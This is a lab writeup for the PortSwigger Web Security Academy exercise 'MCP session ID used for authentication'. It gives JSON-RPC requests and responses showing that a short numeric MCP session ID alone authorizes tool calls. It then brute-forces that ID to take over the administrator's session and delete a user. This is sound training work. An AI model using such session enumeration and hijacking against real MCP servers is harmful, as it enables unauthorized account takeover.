@@ -1,0 +1,280 @@
+---
+title: "MCP session ID used for authentication"
+description: "PortSwigger Web Security Academy lab: an MCP session ID becomes the sole authentication token, and a two-digit brute force lets an ordinary user borrow the administrator's session."
+date: "2026-11-25"
+difficulty: "practitioner"
+published: true
+---
+
+# MCP session ID used for authentication
+
+[Lab link](https://portswigger.net/web-security/mcp/lab-mcp-session-id-used-for-authentication)
+
+This lab builds on the four MCP labs before it:
+
+- [SQL injection in an MCP server tool](https://portswigger.net/web-security/mcp/lab-sql-injection-in-an-mcp-tool), [writeup](/writeups/portswigger/mcp-server-vulnerabilities/sql-injection-in-mcp-server-tool)
+- [Broken access control in an MCP server tool](https://portswigger.net/web-security/mcp/lab-broken-access-control-in-an-mcp-tool), [writeup](/writeups/portswigger/mcp-server-vulnerabilities/broken-access-control-in-an-mcp-server-tool)
+- [MCP server hides tools without restricting them](https://portswigger.net/web-security/mcp/lab-mcp-server-hides-tools-without-restricting-them), [writeup](/writeups/portswigger/mcp-server-vulnerabilities/mcp-server-hides-tools-without-restricting-them)
+- [MCP server authentication fails open](https://portswigger.net/web-security/mcp/lab-mcp-server-authentication-fails-open), [writeup](/writeups/portswigger/mcp-server-vulnerabilities/mcp-server-authentication-fails-open)
+
+---
+
+## Lab overview
+
+This lab is a shop with an MCP endpoint at `/mcp`. The account page shows an API key, and the server provides an MCP session ID that is vulnerable to IDOR.
+
+We start by visiting the site and logging in with `wiener:peter`. There's no part of the front end that has an MCP button or anything similar, so open Burp Suite, intercept a request and send it to Repeater. Change the path to `/mcp`, the method to `POST`, and add the header `Content-Type: application/json`.
+
+Create a new request header `Authorization: Bearer apikey`. On logging in to your account `wiener:peter`, you get your API key on the account page (`m561…wi5F`).
+
+<Callout type="tip" title="Hint">
+  Look closely at the session ID you're issued, and find out which requests still need your API key once you have one.
+</Callout>
+
+## Getting a session ID
+
+We build on the knowledge gained from the previous labs. Start by sending the `initialize` instruction:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 1,
+  "method": "initialize",
+  "params": {
+    "protocolVersion": "2025-06-18",
+    "capabilities": {},
+    "clientInfo": {
+      "name": "repeater",
+      "version": "1.0"
+    }
+  }
+}
+```
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 1,
+  "result": {
+    "protocolVersion": "2025-06-18",
+    "capabilities": {
+      "tools": {
+        "listChanged": false
+      }
+    },
+    "serverInfo": {
+      "name": "shop-mcp",
+      "version": "1.0.0"
+    }
+  }
+}
+```
+
+The response comes with a new header, `Mcp-Session-Id: 703382`:
+
+<div className="max-w-[720px] mx-auto">
+
+![initialize response with the Mcp-Session-Id header](/images/writeups/portswigger/mcp-session-initialize.png)
+
+</div>
+
+If I send the tool list without it:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/list"
+}
+```
+
+it returns "Missing Mcp-Session-Id header" in the response:
+
+<div className="max-w-[720px] mx-auto">
+
+![tools/list without a session ID returns 400](/images/writeups/portswigger/mcp-session-missing-header.png)
+
+</div>
+
+Now let me add the new header to my request:
+
+<div className="max-w-[720px] mx-auto">
+
+![Mcp-Session-Id added to the tools/list request](/images/writeups/portswigger/mcp-session-header-added.png)
+
+</div>
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "tools": [
+      {
+        "name": "list_products",
+        "title": "List products",
+        "description": "Lists the products currently for sale. Optionally filter by category, for example \"Gifts\".",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "category": {
+              "description": "Only return products in this category",
+              "type": "string"
+            }
+          },
+          "required": [],
+          "additionalProperties": false
+        }
+      },
+      {
+        "name": "get_product",
+        "title": "Get product",
+        "description": "Gets the details of a single product by its ID.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {
+            "productId": {
+              "description": "The product ID",
+              "type": "string"
+            }
+          },
+          "required": ["productId"],
+          "additionalProperties": false
+        }
+      },
+      {
+        "name": "get_account_details",
+        "title": "Get account details",
+        "description": "Gets the username and email address of your account.",
+        "inputSchema": {
+          "type": "object",
+          "properties": {},
+          "required": [],
+          "additionalProperties": false
+        }
+      }
+    ]
+  }
+}
+```
+
+The tools we have are `list_products`, `get_product` and `get_account_details`. Like the last lab, `delete_user` doesn't appear here.
+
+## The session ID is the credential
+
+Since the MCP session ID is a number, let's get our account details and see what happens when we change it. For my session:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "get_account_details"
+  }
+}
+```
+
+<div className="max-w-[720px] mx-auto">
+
+![get_account_details with our own session ID](/images/writeups/portswigger/mcp-session-own-account.png)
+
+</div>
+
+I noticed that after removing the `Authorization` header containing my API key, but with my MCP session ID still present, the request is still successful. Let me try the `delete_user` tool:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "delete_user"
+  }
+}
+```
+
+It returns:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "result": {
+    "content": [
+      {
+        "type": "text",
+        "text": "You are not authorized to use this tool"
+      }
+    ],
+    "isError": true
+  }
+}
+```
+
+This happens both when I removed the `Authorization` header and when it's present. All three ordinary methods work without the `Authorization` header, so the MCP session ID is what's used for authorization.
+
+## Enumerating session IDs
+
+I sent the request to Burp Intruder to enumerate the last two digits of the MCP session ID from 1 to 100:
+
+<div className="max-w-[720px] mx-auto">
+
+![Intruder configured to iterate the last two digits of the session ID](/images/writeups/portswigger/mcp-session-intruder-setup.png)
+
+</div>
+
+On doing that I get several 200 OK responses. One stood out because of its response, and that was 78, the full ID being `Mcp-Session-Id: 703378`:
+
+<div className="max-w-[720px] mx-auto">
+
+![Intruder results with payload 78 standing out](/images/writeups/portswigger/mcp-session-intruder-results.png)
+
+</div>
+
+This tells me this is an admin account, so let me test `get_account_details` on it:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "get_account_details"
+  }
+}
+```
+
+<div className="max-w-[720px] mx-auto">
+
+![get_account_details with the administrator's session ID](/images/writeups/portswigger/mcp-session-admin-account.png)
+
+</div>
+
+Perfect. I proceed to delete Carlos with the administrator's session ID:
+
+```json
+{
+  "jsonrpc": "2.0",
+  "id": 3,
+  "method": "tools/call",
+  "params": {
+    "name": "delete_user",
+    "arguments": {
+      "username": "carlos"
+    }
+  }
+}
+```
+
+<div className="max-w-[720px] mx-auto">
+
+![delete_user succeeds with the administrator's session ID](/images/writeups/portswigger/mcp-session-deleted.png)
+
+</div>
+
+It was successfully deleted, and now we've solved the lab.
+
+## Key takeaway
+
+The API key was optional for every ordinary tool call. Once the `initialize` response handed us a session ID, that value alone was enough to act as the user. Because the ID was only a short number, enumerating the last two digits found the administrator's session in a hundred requests. A session identifier needs the same entropy and verification as the credential it replaces, otherwise it becomes a weaker back door into the same account.
